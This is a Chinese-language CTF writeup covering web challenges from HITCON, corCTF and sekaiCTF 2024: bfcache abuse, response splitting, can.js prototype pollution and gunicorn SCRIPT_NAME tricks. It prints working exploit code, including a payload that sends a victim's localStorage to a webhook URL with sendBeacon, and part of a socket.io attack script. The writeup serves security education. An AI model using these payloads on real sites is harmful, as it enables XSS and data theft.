---
title: HITCON CTF & corCTF & sekaiCTF 2024 筆記
url: https://blog.huli.tw/2024/09/23/hitconctf-corctf-sekaictf-2024-writeup/
source: Huli's blog
date: 2024-09-24
fetch_date: 2025-10-06T18:27:33.495993
---

# HITCON CTF & corCTF & sekaiCTF 2024 筆記

[Huli's blog](/)

[文章列表](/archives)
[分類](/categories)
[推薦閱讀](/recommend)
[關於我](/about)

目錄

[1  **HITCON CTF 2024**](#hitcon-ctf-2024)
[1.1  Private Browsing+](#private-browsing)

---

[2  **corCTF 2024**](#corctf-2024)
[2.1  web/corctf-challenge-dev - 17 solves](#webx2fcorctf-challenge-dev-17-solves)
[2.2  web/iframe-note - 2 solves](#webx2fiframe-note-2-solves)
[2.3  corchat x - 1 solve](#corchat-x-1-solve)
[2.4  web/repayment-pal - 0 solve](#webx2frepayment-pal-0-solve)

---

[3  **sekaiCTF 2024**](#sekaictf-2024)
[3.1  htmlsandbox (4 solves)](#htmlsandbox-4-solves)

[English](/2024/09/23/en/hitconctf-corctf-sekaictf-2024-writeup/)

如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：[表單連結](https://forms.gle/XuWyRC5qtSd2ANta8)。若是對更多 JavaScript 知識有興趣，歡迎參考我的新書[《JavaScript 重修就好》](https://www.tenlong.com.tw/products/9786267757048)

# HITCON CTF & corCTF & sekaiCTF 2024 筆記

2024年9月23日

[Security](/categories/Security/)

久違的筆記，想寫很久了但一直拖延，像是 CTF 這種東西的 writeup 其實速度滿重要的，因為賽後討論大部分都在 Discord 裡面發生，時間久了訊息比較難找，而且很有可能忘記，要趕快寫成 writeup 才能把那些實用的資訊記錄下來。

這篇一次帶來三個 CTF 的 writeup，有些我沒有打，只是純粹看著別人的筆記重新記一遍而已。

關鍵字列表：

1. bfcache
2. response splitting
3. Service-Worker-Allowed
4. gunicorn script\_name
5. socket.io disconnect
6. socket.io JSONP CSP bypass
7. performance API
8. streaming HTML parsing
9. content-type ISO-2022-JP

## HITCON CTF 2024

### Private Browsing+

這題基本上是個 proxy，會把 `/~huli/` 底下的東西 proxy 到其他網站，而 response 會根據 header 不同而有所不同：

```
if (
    req.headers['sec-fetch-mode'] &&
    req.headers['sec-fetch-mode'] !== 'navigate' &&
    req.headers['sec-fetch-site'] === 'same-origin'
) {
    req.url = chunks.slice(2).join('/')
    proxy.handler(req, res)
} else {
    res.writeHead(200, { ...DEFAULT_HEADERS, 'content-type': 'text/html' })
    res.end(VIEWER_HTML.replace('SITEB64', btoa(proxy.site)))
}
```

如果是 navigate 的話，就會回傳 VIEWER\_HTML，在這裡面會做各種 sanitize，所以沒辦法 XSS。

繞過方式是利用 bfcache，在 [SECCON CTF 2022 Quals - spanote](https://blog.huli.tw/2022/12/08/ctf-js-notes/#seccon-ctf-2022-quals-spanote) 有出現過，簡單來講呢，我們先造訪 target.html，此時的 response 會是 VIEWER\_HTML，而在 VIEWER\_HTML 內會執行 `fetch('target.html')` 去把內容抓回來，這時候 response 就會被放在 cache 中

再來，我們把同個分頁導到自己的 origin，接著執行 `history.go(-1)`，把 URL 導回去 `target.html`，此時因為 bfcache 的關係，就會載入用 `fetch('target.html')` 所抓取的 HTML，繞過了原本的限制，可以載入任意 HTML。

但下一個問題是 CSP：`default-src 'self';`，因此 script 只能載入 same-origin 的，但 proxy 那邊有限制：

```
if (
    res.headers['content-type'].toLowerCase().includes('script') ||
    req.headers['sec-fetch-dest'] === 'script'
) {
    res.headers['content-length'] = '0'
    delete res.headers['transfer-encoding']
}
```

如果 content type 包含 script，直接把 content-length 變成 0，因此沒辦法載入 script。

這時候就要用到 response splitting 了，因為 proxy 那邊會直接把收到的 response pipe 出去，因此可以構造出這樣的流程：

1. 在 browser 那端發出第一個請求，就叫請求 A 吧
2. 在請求 A 的 response 中先輸出 `expect: '100-continue'` header，讓 proxy server 那邊把 header 輸出，此時對瀏覽器來說第一個請求已經結束，拿到了 response，
3. browser 發出第二個請求 B，延用同一個 connection
4. 這時輸出請求 B 的 response（但是對 proxy 來說還是請求 A 的 response），繞過 content type 的限制，因為 proxy 認為這是 response content

簡單來講就是類似 request smuggling 那樣，不過是反過來做。

這邊的細節有兩個：

1. 透過 Chrome 對同一個 domain 有 6 個 concurrent 的限制，確保其中兩個請求會用到同一個 connection
2. Node.js server 在收到 `Expect: 100-continue` 的時候，會先 flush，這一步是必要的，要繞過 Chrome 的限制

可以載入 JS 之後，就再用一樣的方法載入 service worker，並且用 `Service-Worker-Allowed: /` header 來擴大 scope，可以註冊到整個 origin。

更多細節可以參考 maple 的 writeup: <https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202024/Private%20Browsing%2B>

## corCTF 2024

### web/corctf-challenge-dev - 17 solves

Author: drakon

一個跟 Chrome extension 有關的題目，但作者已經寫得很詳細了，就不多寫了：[corCTF 2024 - corctf-challenge-dev](https://cor.team/posts/corctf-2024-corctf-challenge-dev/)

### web/iframe-note - 2 solves

Author: sterllic

這題的核心程式碼是底下這段：

```
<iframe id="iframe"></iframe>
<script src="{{ url_for('static', filename='axios.min.js') }}"></script>
<script src="{{ url_for('static', filename='can.min.js') }}"></script>
<script>
  window.onload = () => {
    if (["__proto__", "constructor", "prototype"].some(d => location.search.includes(d))) {
      return;
    }

    const qs = can.deparam(location.search.slice(1));

    if (!qs.id) {
      alert("no id provided");
      location.href = "/";
    }

    axios.get(`/iframe/${encodeURIComponent(qs.id)}`)
    .then(res => {
      if (res.data.error) {
        alert("no iframe found with that id!");
        return;
      }

      if (!res.data.url.toLowerCase().startsWith("http")) {
        alert("invalid url");
        return;
      }

      document.querySelector("#name").textContent = res.data.name;
      document.querySelector("#iframe").src = res.data.url;
      document.querySelector("#iframe").style = res.data.style;
    });
  }
</script>
```

後端用 Flask + gunicorn 渲染出上面這個網頁。

can.js 有個 prototype pollution 的漏洞，就算有做了檢查還是可以用 URL encode 繞過，但問題是有了 pollution 之後可以幹嘛。

前端乍看之下就是 `document.querySelector("#iframe").src = res.data.url` 這段最可疑了，但是這邊需要能控制 server 的 response，但是 server 那邊有做檢查，因此 data.url 只能是 http 開頭。

最後的解法是跟 axios、bfcache 還有 gunicorn 的行為有關，gunicorn 會根據 header 裡面的 `script_name` 來決定最後的 path，以 [Gunicorn’s handling of PATH\_INFO and SCRIPT\_NAME can lead to security issues when placed behind a proxy #2650](https://github.com/benoitc/gunicorn/issues/2650) 裡面給的範例來說：

```
requests.get(URL+'/REMOVED/admin/something/bad',
             headers={'script_name':'REMOVED/'})
```

如果前面有個 nginx 把所有 /admin 開頭的請求都擋掉，這時我們可以發送一個 /REMOVED/admin 的請求再搭配 script\_name 是 REMOVED/，nginx 會通過，但是到 gunicorn 的時候就會把 path 解析為 /admin，直接繞過了前面的 nginx 檢查。

而這題會用到這個行為的地方在：

```
<script src="{{ url_for('static', filename='axios.min.js') }}"></script>
```

如果你執行 `curl https://iframe-note.be.ax////example.com/view -H "SCRIPT_NAME: //example.com`，那最後 path 是 /view，但是 base URL 會變，渲染的結果是：

```
<script src="//example.com/static/axios.min.js"></script>
```

就能夠直接控制頁面上的 src。

作者可能懶得弄一個 instance 來 host payload，因此直接用了 data URI，把 script 變成 `<script src="data:text/javascript,{XSS}">`

因為要達成這個結果需要在請求中傳送 header，所以需要用到 bfcache，流程是：

1. 先造訪最後需要的 URL
2. 跳轉到 view 頁面，利用 prototype pollution 讓 fetch 送出有 header 的請求
3. 回到上一頁，此時因為 bfcache，會沿用剛剛 fetch 的 response，就是有 header 的版本
4. XSS

作者的 exploit：

```
<body>
  <script>
    // const BASE_URL = "http://localhost:3000";
    const BASE_URL = "https://iframe-note.be.ax";

    const HOOK_URL = "https://webhook.site/xxxxx";

    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    const main = async () => {
      const dataUrl = `data:text/javascript,navigator.sendBeacon('${HOOK_URL}',JSON.stringify(localStorage))`;

      const win = open(`${BASE_URL}/${dataUrl}/iframe/view`);
      await sleep(1000);

      win.location = `${BASE_URL}/view?id=view&__%70roto__[headers][SCRIPT_NAME]=${dataUrl}/iframe&__%70roto__[baseURL]=/${dataUrl}/`;
      await sleep(1000);

      win.location = `${location.origin}/back.html?n=2`;
    };
    main();
  </script>
</body>
```

```
<script>
  const n = parseInt(new URLSearchParams(location.search).get("n"));
  history.go(-n);
</script>
```

### corchat x - 1 solve

Author: larry

跟 socket.io 有關的題目，重點看起來是三個：

1. 可以送出 disconnect 事件但是沒有 disconnect
2. sokcet.io 的 JSONP 可以拿來 bypass CSP
3. 用 performance API 列出曾經載入過的資源

底下附上 Discord 中 EhhThing 貼的 exploit：

```
import socketio
import requests
import time
import json

base_url = 'https://corchat-x-a6e1f8c45d3ca520.be.ax'

def create_sid():
    session = requests.Session()
    login = session.post(f'{base_url}/', data = {}, allow_redirects=False)
    assert login.status_code == 302, login.status_code

    res = session.get(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'bingus',
    })
    assert res.status_code == 200, res.status_code

    socket_session = json.loads(res.text[1:])
    print('fake session', socket_session)

    res = session.post(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'P3qHGUZ',
        'sid': socket_session['sid'],
    }, data = b'40')
    assert res.status_...